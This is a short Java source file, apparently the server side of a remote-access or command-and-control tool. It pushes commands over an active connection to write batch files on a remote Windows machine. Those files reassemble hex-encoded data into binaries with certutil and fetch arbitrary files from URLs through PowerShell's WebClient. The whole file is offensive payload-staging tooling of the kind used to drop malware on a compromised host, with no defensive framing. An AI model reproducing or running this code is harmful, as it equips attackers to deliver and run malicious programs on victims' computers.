package nettyTest.server.commands;

import nettyTest.server.Data;

import java.io.UnsupportedEncodingException;

public class LoadToolsPowershell {
    public static void run(String command) throws UnsupportedEncodingException, InterruptedException {
        Data.activeConnection.send("type nul > writer.bat" + "\n");
        Data.activeConnection.send("echo \"@echo off\" >> writer.bat" + "\n");
        Data.activeConnection.send("echo. >> writer.bat\n");
        Data.activeConnection.send("echo \"echo|set /p=%1 >>temp.txt\" >> writer.bat\n");
        Data.activeConnection.send("echo. >> writer.bat\n");

        Data.activeConnection.send("type nul > create.bat" + "\n");
        Data.activeConnection.send("echo /p=\"@echo off\" >> create.bat" + "\n");
        Data.activeConnection.send("echo. >> create.bat\n");
        Data.activeConnection.send("echo \"certutil -f -decodehex temp.txt %1 >nul\" >> create.bat\n");
        Data.activeConnection.send("echo. >> create.bat\n");
        Data.activeConnection.send("echo del temp.txt >> create.bat\n");

        //load download.bat
        //Data.activeConnection.send("type nul > download.bat" + "\n");
        Data.activeConnection.send("echo \"powershell -Command \"(New-Object Net.WebClient).DownloadFile('%1', '%2')\"\" > download.bat" + "\n");
        System.out.println("Done!");
    }
}
